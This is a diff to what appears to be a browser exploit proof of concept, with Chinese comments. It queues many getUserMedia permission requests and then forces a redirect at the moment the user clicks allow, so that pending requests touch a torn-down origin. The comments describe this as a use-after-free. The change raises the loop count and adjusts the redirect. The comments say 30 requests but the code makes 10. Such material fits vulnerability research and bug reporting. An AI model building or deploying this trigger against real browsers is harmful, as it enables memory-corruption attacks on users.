@@ -36,19 +36,18 @@
             
             // 核心伏笔：一口气往内核的 PermissionRequestManager 里塞入 30 个任务
             // 此时底层会生成 30 个 MediaAccessPermissionRequest 对象
-            for (let i = 0; i < 1; i++) {
+            for (let i = 0; i < 10; i++) {
                 navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                 .then((stream) => {
                     // 核心时序：当你手动点击“允许”的瞬间，第 1 个排队成功的请求会立刻触发此回调
                     // 并在零点几毫秒内执行跨域重定向，强行让内核对当前页面执行 Tear Down（大卸八块）
                     // 此时，后面剩下的 29 个请求还在内核管道里排队执行 OnAccept() 流程
                     // 它们一睁眼，正好撞上老 Origin 被释放、摄像头字符串填坑的毁灭现场！
-                    window.location.href = "http://unisolated.invalid/";
+                    window.location.href = "about:blank";
                 })
                 .catch(err => {
                     console.log("请求被拒绝或取消");
                 });
-                window.location.href = "http://unisolated.invalid/";
             }
         }
     </script>
